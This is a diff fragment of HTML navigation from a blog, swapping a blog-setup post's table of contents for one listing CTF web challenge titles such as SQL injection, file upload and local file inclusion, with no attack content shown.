-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建博客"><span class="nav-number">1.</span> <span class="nav-text">搭建博客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">2.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-web2"><span class="nav-number">1.</span> <span class="nav-text">0x01.web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-文件上传测试"><span class="nav-number">2.</span> <span class="nav-text">0x02.文件上传测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-计算器"><span class="nav-number">3.</span> <span class="nav-text">0x03.计算器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-web基础-GET"><span class="nav-number">4.</span> <span class="nav-text">0x04.web基础$_GET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-web基础-POST"><span class="nav-number">5.</span> <span class="nav-text">0x05.web基础$_POST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-矛盾"><span class="nav-number">6.</span> <span class="nav-text">0x06.矛盾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-web3"><span class="nav-number">7.</span> <span class="nav-text">0x07.web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-sql注入"><span class="nav-number">8.</span> <span class="nav-text">0x08.sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09域名解析"><span class="nav-number">9.</span> <span class="nav-text">0x09域名解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10SQL注入1"><span class="nav-number">10.</span> <span class="nav-text">0x10SQL注入1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11你必须让他停下"><span class="nav-number">11.</span> <span class="nav-text">0x11你必须让他停下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12本地包含"><span class="nav-number">12.</span> <span class="nav-text">0x12本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13变量1"><span class="nav-number">13.</span> <span class="nav-text">0x13变量1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14web5"><span class="nav-number">14.</span> <span class="nav-text">0x14web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15头等舱"><span class="nav-number">15.</span> <span class="nav-text">0x15头等舱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16web4"><span class="nav-number">16.</span> <span class="nav-text">0x16web4</span></a></li></ol></div>
             
 
           </div>
